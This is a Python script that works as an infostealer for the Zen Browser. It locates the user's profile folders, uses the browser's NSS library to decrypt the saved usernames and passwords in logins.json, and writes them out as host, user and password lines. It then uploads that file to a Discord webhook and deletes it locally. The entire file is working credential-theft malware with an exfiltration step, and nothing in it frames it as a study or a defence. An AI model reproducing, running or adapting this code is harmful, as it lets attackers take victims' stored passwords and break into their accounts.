import os
import json
import ctypes
import base64
import getpass
import requests
import hashlib

username = getpass.getuser()

def find_profiles(path):
    profiles = []
    for name in os.listdir(path):
        p = os.path.join(path, name)
        if os.path.isdir(p):
            if all(os.path.exists(os.path.join(p, f)) for f in ['logins.json', 'key4.db', 'cert9.db']):
                profiles.append(p)
    return profiles

def setup_nss(profile_path):
    nss_path = r'C:\Program Files\Zen Browser'  # путь - NSS
    os.environ['PATH'] += f';{nss_path}'
    nss = ctypes.CDLL(os.path.join(nss_path, 'nss3.dll'))

    if nss.NSS_Init(profile_path.encode()) != 0:
        raise RuntimeError('NSS_Init failed')
    return nss

def decrypt_logins(profile_path, nss):
    with open(os.path.join(profile_path, 'logins.json'), 'r', encoding='utf-8') as f:
        data = json.load(f)

    class SECItem(ctypes.Structure):
        _fields_ = [('type', ctypes.c_uint), ('data', ctypes.c_char_p), ('len', ctypes.c_uint)]

    def decrypt_string(enc_b64):
        enc = base64.b64decode(enc_b64)
        item = SECItem()
        item.type = 0
        item.len = len(enc)
        item.data = ctypes.cast(ctypes.create_string_buffer(enc), ctypes.c_char_p)

        out = SECItem()
        if nss.PK11SDR_Decrypt(ctypes.byref(item), ctypes.byref(out), None) == 0:
            return ctypes.string_at(out.data, out.len).decode()
        return ''

    results = []
    for login in data['logins']:
        user = decrypt_string(login['encryptedUsername'])
        pw = decrypt_string(login['encryptedPassword'])
        host = login['hostname']
        results.append(f'{host} | {user} | {pw}')
    return results

def save_to_txt(data, filename="decrypted_logins.txt"):
    with open(filename, 'w', encoding='utf-8') as f:
        f.write('\n'.join(data))
    return filename

def send_discord(webhook_url, data, filename):
    txt_file = save_to_txt(data, filename)
    with open(txt_file, 'rb') as f:
        files = {'file': (txt_file, f, 'text/plain')}
        payload = {"content": "Decrypted Browser Logins File"}
        requests.post(webhook_url, data=payload, files=files)
    os.remove(txt_file)

def get_file_signature(file_path):
    with open(file_path, 'rb') as f:
        file_content = f.read()
    return hashlib.sha256(file_content).hexdigest()

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/ ? "  # Webhook URL
    profiles_base = rf'C:\Users\{username}\AppData\Roaming\zen\Profiles'
    profiles = find_profiles(profiles_base)

    all_results = []
    for profile in profiles:
        try:
            nss = setup_nss(profile)
            res = decrypt_logins(profile, nss)
            all_results.extend(res)
        except Exception as e:
            continue

    if all_results:
        send_discord(webhook_url, all_results, "decrypted_logins.txt")
